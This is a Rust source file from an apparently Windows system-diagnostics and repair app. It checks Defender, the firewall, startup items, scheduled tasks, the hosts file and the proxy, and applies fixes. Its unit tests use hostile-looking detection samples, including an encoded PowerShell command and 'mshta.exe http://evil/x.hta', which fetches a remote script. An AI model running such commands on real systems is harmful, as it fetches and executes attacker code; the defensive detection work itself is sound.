try { $r.otherFirewall = @(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName FirewallProduct -ErrorAction Stop | Where-Object { $_.displayName -notmatch '^(Windows|Microsoft Defender) Firewall' -and ((([int]$_.productState) -band 0x1000) -ne 0) } | ForEach-Object { [string]$_.displayName }) } catch {}
$r.firewallOff = @()
try { $r.firewallOff = @(Get-NetFirewallProfile -ErrorAction Stop | Where-Object { [string]$_.Enabled -eq 'False' } | ForEach-Object { [string]$_.Name }) } catch {}
$r.tasks = @()
try {
  $r.tasks = @(Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\Microsoft\*' } | ForEach-Object {
    $t = $_; foreach ($a in @($t.Actions)) { if ($a.Execute) { [pscustomobject]@{ name = [string]$t.TaskName; path = [string]$t.TaskPath; exec = [string]$a.Execute; args = [string]$a.Arguments } } } })
} catch {}
[pscustomobject]$r | ConvertTo-Json -Depth 5 -Compress
"#;

fn reg_dword(hive: winreg::HKEY, path: &str, name: &str) -> Option<u32> {
    use winreg::enums::*;
    winreg::RegKey::predef(hive).open_subkey_with_flags(path, KEY_READ | KEY_WOW64_64KEY).ok()?.get_value::<u32, _>(name).ok()
}

fn reg_key_exists(path: &str) -> bool {
    use winreg::enums::*;
    winreg::RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags(path, KEY_READ | KEY_WOW64_64KEY).is_ok()
}

fn hosts_path() -> PathBuf {
    system_root().join(r"System32\drivers\etc\hosts")
}

fn nvidia_gpu_temp() -> Option<f64> {
    let candidates = [
        util::sys_tool("nvidia-smi.exe"),
        env_path("ProgramW6432").map(|p| p.join(r"NVIDIA Corporation\NVSMI\nvidia-smi.exe")).unwrap_or_default(),
    ];
    let exe = candidates.into_iter().find(|p| p.is_file())?;
    let out = std::process::Command::new(exe)
        .args(["--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"])
        .creation_flags_hidden()
        .output()
        .ok()?;
    String::from_utf8_lossy(&out.stdout).lines().filter_map(|l| l.trim().parse::<f64>().ok()).fold(None, |m, t| Some(m.map_or(t, |x: f64| x.max(t))))
}

trait HiddenCmd {
    fn creation_flags_hidden(&mut self) -> &mut Self;
}
impl HiddenCmd for std::process::Command {
    fn creation_flags_hidden(&mut self) -> &mut Self {
        use std::os::windows::process::CommandExt;
        self.creation_flags(util::CREATE_NO_WINDOW)
    }
}

/// Unsigned executables running from Temp / Downloads / Public (one PowerShell signature check).
fn suspicious_processes(state: &AppState) -> Vec<(String, String)> {
    let mut paths: Vec<String> = crate::system::list_processes(state)
        .into_iter()
        .filter_map(|p| p.exe)
        .filter(|e| {
            let l = e.to_lowercase();
            // Installers unpack themselves as *.tmp into Temp (Inno Setup "is-*.tmp") — normal.
            let installer_tmp = l.ends_with(".tmp");
            !installer_tmp && (l.contains(r"\appdata\local\temp\") || l.contains(r"\windows\temp\") || l.contains(r"\downloads\") || l.contains(r"\users\public\"))
        })
        .collect();
    paths.sort();
    paths.dedup();
    paths.truncate(20);
    if paths.is_empty() {
        return vec![];
    }
    let list = paths.iter().map(|p| psq(p)).collect::<Vec<_>>().join(",");
    // -LiteralPath: [ ] in folder names are not wildcards.
    let script = format!(
        "ConvertTo-Json -Compress -InputObject @(@({list}) | ForEach-Object {{ $s = Get-AuthenticodeSignature -LiteralPath $_ -ErrorAction SilentlyContinue; [pscustomobject]@{{ path = $_; status = [string]$s.Status }} }})"
    );
    #[derive(Deserialize, Default)]
    #[serde(default)]
    struct Sig {
        path: String,
        status: String,
    }
    let sigs: Vec<Sig> = util::ps_json_timeout(&script, 60).unwrap_or_default();
    // Only clear verdicts: not signed or a broken signature. Unknown/empty results are ignored.
    sigs.into_iter()
        .filter(|s| matches!(s.status.as_str(), "NotSigned" | "HashMismatch" | "NotTrusted"))
        .map(|s| (s.path, s.status))
        .collect()
}

fn collect_local(state: &AppState, defender_scanned: bool) -> LocalRaw {
    use winreg::enums::*;
    let mut l = LocalRaw { admin: util::is_admin(), defender_scanned, ..Default::default() };
    // Prime per-process CPU counters so the list taken after the 2 s window is meaningful.
    let _ = crate::system::list_processes(state);
    // CPU averaged over ~2 s, memory, top processes.
    {
        let mut sys = state.sys.lock();
        let mut samples = Vec::new();
        for _ in 0..5 {
            sys.refresh_cpu_usage();
            samples.push(sys.global_cpu_usage());
            drop(sys);
            std::thread::sleep(Duration::from_millis(450));
            sys = state.sys.lock();
        }
        l.cpu_avg = samples.iter().skip(1).sum::<f32>() / (samples.len().max(2) - 1) as f32;
        sys.refresh_memory();
        if sys.total_memory() > 0 {
            l.mem_pct = (sys.used_memory() as f64 / sys.total_memory() as f64 * 100.0).round() as u32;
        }
    }
    let mut procs = crate::system::list_processes(state);
    procs.sort_by(|a, b| b.cpu.partial_cmp(&a.cpu).unwrap_or(std::cmp::Ordering::Equal));
    l.top_cpu = procs.iter().take(5).map(|p| format!("{} — {:.0}%", p.name, p.cpu)).collect();
    procs.sort_by_key(|x| std::cmp::Reverse(x.memory));
    l.top_mem = procs.iter().take(5).map(|p| format!("{} — {} MB", p.name, p.memory / 1024 / 1024)).collect();
    l.uptime_days = sysinfo::System::uptime() / 86400;

    // System drive space.
    let sys_drive = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".into());
    l.sys_drive = sys_drive.trim_end_matches(':').to_string();
    let mut found = false;
    for d in crate::system::list_disks_raw() {
        if d.0.trim_end_matches('\\').eq_ignore_ascii_case(sys_drive.trim_end_matches('\\')) && d.1 > 0 {
            found = true;
            l.sys_free_bytes = d.2;
            l.sys_free_pct = (d.2 as f64 / d.1 as f64 * 100.0).round() as u32;
        }
    }
    // Drive not found (not "0 bytes free": a full drive is the worst case to report).
    if !found {
        l.sys_free_pct = 100;
        l.sys_free_bytes = u64::MAX / 2;
    }

    // Startup.
    for s in crate::startup::read_all() {
        if !s.enabled {
            continue;
        }
        l.startup_enabled += 1;
        if let Some(reason) = startup_reason(&s.command, s.exe_path.as_deref()) {
            let text = match reason {
                "temp" => tr("запуск из временной папки", "runs from a temp folder"),
                "downloads" => tr("запуск из «Загрузок»", "runs from Downloads"),
                "public" => tr("запуск из общей папки", "runs from the Public folder"),
                "script" => tr("скрытый скрипт", "hidden script"),
                "missing" => tr("файл не найден — остаток удалённой программы", "file not found — leftover of a removed app"),
                other => other.to_string(),
            };
            l.startup_suspicious.push((s.id.clone(), s.name.clone(), text));
        }
    }
    l.processes_suspicious = suspicious_processes(state);
    // Lossy: hosts files with ANSI (e.g. Cyrillic) comments are still checked.
    l.hosts_suspicious = std::fs::read(hosts_path()).map(|b| hosts_suspicious(&String::from_utf8_lossy(&b))).unwrap_or_default();

    // Power plan / laptop.
    l.is_laptop = crate::games::is_laptop();
    l.power_saver = util::run_hidden("powercfg.exe", &["/getactivescheme"])
        .map(|(_, out, _)| out.to_lowercase().contains("a1841308-3541-4fab-bc81-f71556f20b4a"))
        .unwrap_or(false);
    l.junk_bytes = crate::cleanup::safe_junk_size(l.admin);
    l.gpu_temp = nvidia_gpu_temp();
    let displays = crate::display::list();
    l.displays_known = !displays.is_empty();
    l.displays_low = displays
        .into_iter()
        .filter(|d| d.max_rate() > d.current)
        .map(|d| {
            let max = d.max_rate();
            (d.device, d.name, d.current, max)
        })
        .collect();

    // Registry facts.
    l.uac_enabled = reg_dword(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA").map(|v| v != 0).unwrap_or(true);
    l.wu_disabled = reg_dword(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\wuauserv", "Start") == Some(4);
    let inet = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings";
    if reg_dword(HKEY_CURRENT_USER, inet, "ProxyEnable") == Some(1) {
        let server: String = winreg::RegKey::predef(HKEY_CURRENT_USER).open_subkey(inet).and_then(|k| k.get_value("ProxyServer")).unwrap_or_default();
        l.proxy = Some(if server.is_empty() { "?".into() } else { server });
    }
    l.reboot_pending = reg_key_exists(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending")
        || reg_key_exists(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired");
    l
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct Progress {
    step: &'static str,
    done: u32,
    total: u32,
}

fn report_path(dir: &Path) -> PathBuf {
    dir.join("diagnostics.json")
}

#[tauri::command]
pub async fn diag_run(app: AppHandle, defender_scan: bool) -> Res<Report> {
    use crate::ops::{self, Op};
    let started = Instant::now();
    let _running = ops::start(Op::Diag)?;
    let stop = || if ops::cancelled(Op::Diag) { Err(ops::stopped()) } else { Ok(()) };
    let total = if defender_scan { 4 } else { 3 };
    let emit = |app: &AppHandle, step: &'static str, done: u32| {
        let _ = app.emit("diag://progress", Progress { step, done, total });
    };
    let mut done = 0;
    let mut scanned = false;
    if defender_scan {
        emit(&app, "defender", done);
        // A failed scan (Defender off, another antivirus) must not stop the diagnosis.
        ops::DIAG_IN_DEFENDER.store(true, std::sync::atomic::Ordering::SeqCst);
        scanned = util::blocking(|| util::ps_cancel("Start-MpScan -ScanType QuickScan", 1800, Op::Diag).map(|_| ())).await.is_ok();
        ops::DIAG_IN_DEFENDER.store(false, std::sync::atomic::Ordering::SeqCst);
        stop()?;
        done += 1;
    }
    emit(&app, "system", done);
    // If PowerShell fails or hangs (killed after 2 min), its checks are reported as skipped.
    let ps: PsRaw = util::blocking(|| {
        Ok(match util::ps_json_cancel::<PsRaw>(PS_SCRIPT, 120, Op::Diag) {
            Ok(mut raw) => {
                raw.ok = true;
                raw
            }
            Err(_) => PsRaw::default(),
        })
    })
    .await?;
    stop()?;
    done += 1;
    emit(&app, "performance", done);
    let app2 = app.clone();
    let local = util::blocking(move || Ok(collect_local(&app2.state::<AppState>(), scanned))).await?;
    stop()?;
    done += 1;
    emit(&app, "evaluate", done);
    let (issues, checks, score) = evaluate(&ps, &local);
    let report = Report {
        at: SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0),
        duration_ms: started.elapsed().as_millis() as u64,
        score,
        admin: local.admin,
        defender_scanned: scanned,
        issues,
        checks,
    };
    let dir = app.state::<AppState>().data_dir.clone();
    let _ = write_json(&report_path(&dir), &report);
    emit(&app, "done", total);
    Ok(report)
}

#[tauri::command]
pub fn diag_last(state: State<'_, AppState>) -> Option<Report> {
    std::fs::read_to_string(report_path(&state.data_dir)).ok().and_then(|s| serde_json::from_str(&s).ok())
}

/* ------------------------------------------------------------------ */
/* Fixes                                                              */
/* ------------------------------------------------------------------ */

fn require_admin() -> Res<()> {
    if util::is_admin() {
        Ok(())
    } else {
        Err(util::need_admin())
    }
}

/// Removes only the suspicious lines from hosts. Works on raw bytes (keeps the original
/// encoding and line endings of every other line), backs the file up first and replaces it
/// atomically. Returns the backup path.
fn restore_hosts(data_dir: &Path) -> Res<String> {
    require_admin()?;
    let path = hosts_path();
    let raw = std::fs::read(&path).map_err(|e| e.to_string())?;
    let bad: Vec<String> = hosts_suspicious(&String::from_utf8_lossy(&raw)).into_iter().map(|(l, _)| l).collect();
    if bad.is_empty() {
        return Ok(String::new());
    }
    let stamp = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    let backup = data_dir.join(format!("hosts.backup-{stamp}"));
    std::fs::write(&backup, &raw).map_err(|e| e.to_string())?;
    let mut kept: Vec<u8> = Vec::with_capacity(raw.len());
    for chunk in raw.split_inclusive(|b| *b == b'\n') {
        let line = String::from_utf8_lossy(chunk);
        if !bad.iter().any(|b| b == line.trim()) {
            kept.extend_from_slice(chunk);
        }
    }
    let tmp = path.with_extension("stepmaster-tmp");
    let fail = |e: std::io::Error| format!("{}: {e}", tr("Не удалось изменить hosts", "Couldn't edit hosts"));
    std::fs::write(&tmp, &kept).map_err(fail)?;
    if std::fs::rename(&tmp, &path).is_err() {
        // Some security tools lock rename on hosts: fall back to an in-place write.
        let _ = std::fs::remove_file(&tmp);
        std::fs::write(&path, &kept).map_err(fail)?;
    }
    let _ = util::run_hidden("ipconfig.exe", &["/flushdns"]);
    Ok(backup.to_string_lossy().to_string())
}

const INET_SETTINGS: &str = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings";

/// Turns the user's proxy on/off (also the Journal's "Put back").
pub fn set_proxy_enable(v: u32) -> Res<()> {
    use winreg::enums::*;
    let (k, _) = winreg::RegKey::predef(HKEY_CURRENT_USER).create_subkey(INET_SETTINGS).map_err(|e| e.to_string())?;
    k.set_value("ProxyEnable", &v).map_err(|e| e.to_string())?;
    refresh_internet_settings();
    Ok(())
}

/// GUID from `powercfg /getactivescheme` ("…GUID: 381b4222-f694-… (Balanced)"), any language.
fn active_scheme_guid(out: &str) -> Option<String> {
    out.split(|c: char| !(c.is_ascii_hexdigit() || c == '-'))
        .find(|w| w.len() == 36 && w.matches('-').count() == 4)
        .map(str::to_string)
}

/// Tells running apps that proxy settings changed (otherwise browsers keep the old proxy).
fn refresh_internet_settings() {
    use windows_sys::Win32::Networking::WinInet::{InternetSetOptionW, INTERNET_OPTION_REFRESH, INTERNET_OPTION_SETTINGS_CHANGED};
    unsafe {
        InternetSetOptionW(std::ptr::null(), INTERNET_OPTION_SETTINGS_CHANGED, std::ptr::null(), 0);
        InternetSetOptionW(std::ptr::null(), INTERNET_OPTION_REFRESH, std::ptr::null(), 0);
    }
}

/// DISM + SFC must never run twice at the same time.
static REPAIR_RUNNING: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FixResult {
    ok: bool,
    /// Extra info for the UI (e.g. "reboot", or backup path).
    note: String,
}

#[tauri::command]
pub async fn diag_fix(app: AppHandle, fix: String, args: Vec<String>) -> Res<FixResult> {
    let data_dir = app.state::<AppState>().data_dir.clone();
    let journal_dir = data_dir.clone();
    let fix_id = fix.clone();
    util::blocking(move || {
        use crate::journal::Undo;
        // What "Put back" in the Journal restores (set by the fixes that change a setting).
        let mut undo: Option<Undo> = None;
        let note = match fix.as_str() {
            "cleanup_safe" => {
                let freed = crate::cleanup::clean_safe(&data_dir, util::is_admin());
                freed.to_string()
            }
            "power_balanced" => {
                let (_, cur, _) = util::run_hidden("powercfg.exe", &["/getactivescheme"])?;
                undo = active_scheme_guid(&cur).map(|guid| Undo::Power { guid });
                let (ok, _, err) = util::run_hidden("powercfg.exe", &["/setactive", "381b4222-f694-41f0-9685-ff5bb260df2e"])?;
                if !ok {
                    return Err(err);
                }
                String::new()
            }
            "update_signatures" => {
                util::ps_timeout("Update-MpSignature", 300)?;
                String::new()
            }
            "remove_threats" => {
                require_admin()?;
                // Re-check right before acting: Remove-MpThreat removes EVERY active threat, so
                // never run it while a potentially unwanted (often user-installed) app is listed.
                #[derive(Deserialize, Default)]
                #[serde(default)]
                struct T {
                    name: String,
                }
                let active: Vec<T> = util::ps_json_timeout(
                    "ConvertTo-Json -Compress -InputObject @(Get-MpThreat | Where-Object { $_.IsActive } | ForEach-Object { [pscustomobject]@{ name = [string]$_.ThreatName } })",
                    60,
                )?;
                if active.iter().any(|t| ThreatRaw { name: t.name.clone(), resources: vec![] }.is_pua()) {
                    return Err(tr(
                        "Среди угроз есть нежелательные программы — удалите угрозы вручную в «Безопасности Windows»",
                        "Some threats are potentially unwanted apps — remove threats manually in Windows Security",
                    ));
                }
                util::ps_timeout("Remove-MpThreat", 300)?;
                String::new()
            }
            "quick_scan" => {
                util::ps_timeout("Start-MpScan -ScanType QuickScan", 1800)?;
                String::new()
            }
            "enable_firewall" => {
                require_admin()?;
                let before: Vec<(String, bool)> = util::ps_json_timeout(
                    "ConvertTo-Json -Compress -InputObject @(Get-NetFirewallProfile | ForEach-Object { ,@([string]$_.Name, ([string]$_.Enabled -eq 'True')) })",
                    30,
                )
                .unwrap_or_default();
                util::ps_timeout("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True", 90)?;
                undo = (!before.is_empty()).then_some(Undo::Firewall { profiles: before });
                String::new()
            }
            "enable_uac" => {
                require_admin()?;
                util::ps_timeout(r"Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name EnableLUA -Value 1 -Type DWord", 60)?;
                "reboot".to_string()
            }
            "enable_wu" => {
                require_admin()?;
                let before = crate::services::start_type("wuauserv");
                util::ps_timeout("Set-Service -Name wuauserv -StartupType Manual; Start-Service -Name wuauserv -ErrorAction SilentlyContinue", 120)?;
                undo = before.map(|mode| Undo::ServiceMode { name: "wuauserv".into(), mode });
                String::new()
            }
            "disable_startup" => {
                // Each item gets its own Journal entry right away, so what was turned off before
                // a failure can still be put back.
                for id in args.iter().take(50) {
                    crate::startup::set_enabled(id, false)?;
                    let name = id.rsplit('|').next().unwrap_or(id);
                    crate::journal::add_at(&journal_dir, "startup_off", name, "", Some(Undo::Startup { id: id.clone(), enabled: true }));
                }
                String::new()
            }
            "refresh_max" => {
                // Pairs: device, rate. Each monitor gets its own Journal entry right away.
                for pair in args.chunks(2).take(16) {
                    let [device, hz] = pair else { continue };
                    let hz: u32 = hz.parse().map_err(|_| tr("Неверная частота", "Invalid refresh rate"))?;
                    let name = crate::display::list().into_iter().find(|d| d.device.eq_ignore_ascii_case(device)).map(|d| d.name).unwrap_or_else(|| device.clone());
                    let prev = crate::display::set_rate(device, hz)?;
                    if prev != hz {
                        crate::journal::add_at(&journal_dir, "refresh_rate", &name, &hz.to_string(), Some(Undo::Refresh { device: device.clone(), hz: prev }));
                    }
                }
                String::new()
            }
            "restore_hosts" => restore_hosts(&data_dir)?,
            "disable_proxy" => {
                use winreg::enums::*;
                let before: u32 = winreg::RegKey::predef(HKEY_CURRENT_USER)
                    .open_subkey(INET_SETTINGS)
                    .and_then(|k| k.get_value("ProxyEnable"))
                    .unwrap_or(0);
                set_proxy_enable(0)?;
                undo = (before != 0).then_some(Undo::Proxy { enable: before });
                String::new()
            }
            "repair_system" => {
                require_admin()?;
                use std::sync::atomic::Ordering;
                if REPAIR_RUNNING.swap(true, Ordering::SeqCst) {
                    return Err(tr("Восстановление уже выполняется", "Repair is already running"));
                }
                // Official Windows repair: component store first, then system files.
                // "Stop" ends it; a hung step is ended after an hour.
                crate::ops::begin(crate::ops::Op::Repair);
                let res = (|| {
                    let op = crate::ops::Op::Repair;
                    let (ok1, o1, e1) = util::run_hidden_limit("DISM.exe", &["/Online", "/Cleanup-Image", "/RestoreHealth"], 3600, op)?;
                    let (ok2, o2, e2) = util::run_hidden_limit("sfc.exe", &["/scannow"], 3600, op)?;
                    if !ok1 && !ok2 {
                        let msg = [e1, e2, o1, o2].iter().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect::<Vec<_>>().join(" ");
                        let short: String = msg.chars().take(400).collect();
                        return Err(short);
                    }
                    Ok("reboot".to_string())
                })();
                REPAIR_RUNNING.store(false, Ordering::SeqCst);
                res?
            }
            "scan_files" => {
                // Local files only (no \\server paths that would make Windows contact another PC).
                let paths: Vec<&String> = args
                    .iter()
                    .filter(|p| !p.starts_with(r"\\") && Path::new(p).is_absolute() && Path::new(p).exists())
                    .take(20)
                    .collect();
                for p in paths {
                    util::ps_timeout(&format!("Start-MpScan -ScanType CustomScan -ScanPath {}", psq(p)), 1800)?;
                }
                String::new()
            }
            _ => return Err(tr("Неизвестное исправление", "Unknown fix")),
        };
        crate::journal::add_at(&journal_dir, "diag_fix", &fix_id, &note, undo);
        Ok(FixResult { ok: true, note })
    })
    .await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn refresh_rate_below_max() {
        let (ps, mut l) = healthy();
        l.displays_known = true;
        let codes = |l: &LocalRaw| evaluate(&ps, l).0.into_iter().map(|i| i.code).collect::<Vec<_>>();
        assert!(!codes(&l).contains(&"refresh_rate".to_string()));
        l.displays_low = vec![(r"\\.\DISPLAY1".into(), "Monitor".into(), 60, 75)];
        let (issues, _, _) = evaluate(&ps, &l);
        let i = issues.iter().find(|i| i.code == "refresh_rate").expect("refresh issue");
        assert_eq!(i.fix.as_deref(), Some("refresh_max"));
        assert_eq!(i.fix_args, vec![r"\\.\DISPLAY1".to_string(), "75".to_string()]);
        assert_eq!(i.params.get("max").map(String::as_str), Some("75"));
    }

    #[test]
    fn power_guid_any_language() {
        let ru = "GUID схемы питания: 381b4222-f694-41f0-9685-ff5bb260df2e  (Сбалансированная)";
        assert_eq!(active_scheme_guid(ru).as_deref(), Some("381b4222-f694-41f0-9685-ff5bb260df2e"));
        assert_eq!(active_scheme_guid("no guid here"), None);
    }

    fn healthy() -> (PsRaw, LocalRaw) {
        let ps = PsRaw {
            ok: true,
            disks: vec![PhysDisk { name: "SSD".into(), health: "Healthy".into(), media: "SSD".into(), wear: Some(3.0), temp: Some(40.0), read_errors: Some(0.0) }],
            thermal_c: Some(55.0),
            defender: DefenderRaw { available: true, realtime: true, sig_age_days: 0, quick_scan_age_days: 1, ..Default::default() },
            ..Default::default()
        };
        let l = LocalRaw {
            admin: true,
            cpu_avg: 12.0,
            mem_pct: 50,
            uptime_days: 1,
            sys_free_pct: 40,
            sys_free_bytes: 200 * GB,
            sys_drive: "C".into(),
            startup_enabled: 4,
            uac_enabled: true,
            ..Default::default()
        };
        (ps, l)
    }

    #[test]
    fn healthy_pc_scores_100() {
        let (ps, l) = healthy();
        let (issues, checks, score) = evaluate(&ps, &l);
        assert!(issues.is_empty(), "{issues:?}");
        assert_eq!(score, 100);
        assert!(checks.iter().all(|c| c.status != "issue"));
    }

    #[test]
    fn problems_are_detected_and_sorted() {
        let (mut ps, mut l) = healthy();
        ps.defender.threats = vec![ThreatRaw { name: "Trojan:Win32/Test".into(), resources: vec![r"file:_C:\x\bad.exe".into()] }];
        ps.firewall_off = vec!["Public".into()];
        ps.bugchecks = EventCount { count: 1, last: "2026-11-10 10:00".into() };
        l.sys_free_pct = 4;
        l.sys_free_bytes = 2 * GB;
        l.uac_enabled = false;
        l.proxy = Some("10.1.2.3:8080".into());
        let (issues, _, score) = evaluate(&ps, &l);
        let codes: Vec<&str> = issues.iter().map(|i| i.code.as_str()).collect();
        assert_eq!(issues[0].severity, "critical");
        assert!(codes.contains(&"threats") && codes.contains(&"firewall") && codes.contains(&"bsod"));
        assert!(codes.contains(&"disk_space") && codes.contains(&"uac") && codes.contains(&"proxy"));
        let threats = issues.iter().find(|i| i.code == "threats").unwrap();
        assert_eq!(threats.fix.as_deref(), Some("remove_threats"));
        assert!(threats.details[0].contains(r"C:\x\bad.exe"));
        assert!(score < 60);
    }

    #[test]
    fn pua_is_separate_and_never_auto_removed() {
        let (mut ps, l) = healthy();
        ps.defender.threats = vec![
            ThreatRaw { name: "PUA:Win32/Packunwan".into(), resources: vec![] },
            ThreatRaw { name: "Trojan:Win32/Real".into(), resources: vec![] },
        ];
        let (issues, _, _) = evaluate(&ps, &l);
        let pua = issues.iter().find(|i| i.code == "pua").expect("pua issue");
        assert_eq!(pua.severity, "medium");
        assert!(pua.fix.is_none());
        // With a PUA present, the malware issue must not offer Remove-MpThreat (it would remove both).
        assert!(issues.iter().find(|i| i.code == "threats").unwrap().fix.is_none());
    }

    #[test]
    fn powershell_failure_skips_instead_of_alarming() {
        let (_, l) = healthy();
        let ps = PsRaw::default(); // ok = false
        let (issues, checks, _) = evaluate(&ps, &l);
        assert!(!issues.iter().any(|i| i.code == "no_antivirus" || i.code == "defender_off"));
        assert!(checks.iter().any(|c| c.code == "threats" && c.status == "skipped"));
        assert!(checks.iter().any(|c| c.code == "bsod" && c.status == "skipped"));
    }

    #[test]
    fn local_vpn_proxy_is_not_a_problem() {
        assert!(is_loopback_proxy("127.0.0.1:10809"));
        assert!(is_loopback_proxy("localhost:7890"));
        assert!(is_loopback_proxy("http=127.0.0.1:8080;https=127.0.0.1:8080"));
        assert!(!is_loopback_proxy("10.0.0.5:3128"));
        let (ps, mut l) = healthy();
        l.proxy = Some("127.0.0.1:10809".into());
        let (issues, _, _) = evaluate(&ps, &l);
        assert!(!issues.iter().any(|i| i.code == "proxy"));
    }

    #[test]
    fn defender_counters_ignored_when_another_antivirus_is_primary() {
        let (mut ps, l) = healthy();
        ps.other_av = vec!["Kaspersky".into()];
        ps.defender.sig_age_days = 40;
        ps.defender.quick_scan_age_days = -1;
        let (issues, _, _) = evaluate(&ps, &l);
        assert!(!issues.iter().any(|i| i.code == "signatures" || i.code == "never_scanned" || i.code == "last_scan"));
    }

    #[test]
    fn defender_off_with_other_antivirus_is_fine() {
        let (mut ps, l) = healthy();
        ps.defender.realtime = false;
        ps.other_av = vec!["Kaspersky".into()];
        let (issues, _, _) = evaluate(&ps, &l);
        assert!(!issues.iter().any(|i| i.code == "defender_off" || i.code == "no_antivirus"));
    }

    #[test]
    fn hosts_rules() {
        let text = "# comment\n127.0.0.1 localhost\n0.0.0.0 vortex.data.microsoft.com\n127.0.0.1 kaspersky.com\n5.6.7.8 vk.com\n0.0.0.0 ads.example.com\n0.0.0.0 preset.example.com\n0.0.0.0 reset.myrouter.net\n";
        let bad = hosts_suspicious(text);
        assert_eq!(bad, vec![("127.0.0.1 kaspersky.com".to_string(), true), ("5.6.7.8 vk.com".to_string(), false)]);
    }

    #[test]
    fn task_and_startup_rules() {
        let t = |e: &str, a: &str| TaskRaw { name: "x".into(), path: "\\".into(), exec: e.into(), args: a.into() };
        assert_eq!(suspicious_tasks(&[t(r"C:\Users\A\AppData\Local\Temp\x.exe", "")]).len(), 1);
        assert_eq!(suspicious_tasks(&[t("powershell.exe", "-NoP -EncodedCommand AAAA")]).len(), 1);
        assert_eq!(suspicious_tasks(&[t("mshta.exe", "http://evil/x.hta")]).len(), 1);
        assert_eq!(suspicious_tasks(&[t(r"C:\Program Files\Google\Update\GoogleUpdate.exe", "/c")]).len(), 0);
        // OEM scripts from Program Files are fine; %LOCALAPPDATA%\Temp is expanded and caught.
        assert_eq!(suspicious_tasks(&[t("wscript.exe", r#""C:\Program Files\Vendor\task.vbs""#)]).len(), 0);
        assert_eq!(suspicious_tasks(&[t(r"%LOCALAPPDATA%\Temp\upd.exe", "")]).len(), 1);
        assert_eq!(startup_reason(r"C:\Users\A\AppData\Local\Temp\a.exe", None), Some("temp"));
        assert_eq!(startup_reason(r#""C:\Program Files\Steam\steam.exe" -silent"#, None), None);
        assert_eq!(startup_reason("x", Some(r"C:\definitely\missing\app.exe")), Some("missing"));
    }

    #[test]
    fn score_bounds() {
        let mk = |s: &str| Issue { code: "x".into(), category: "c".into(), severity: s.into(), params: Default::default(), details: vec![], fix: None, fix_args: vec![], open: None };
        assert_eq!(score_of(&[]), 100);
        assert_eq!(score_of(&vec![mk("critical"); 10]), 0);
        assert_eq!(score_of(&[mk("info")]), 100);
        assert_eq!(score_of(&[mk("medium"), mk("low")]), 92);
    }
}
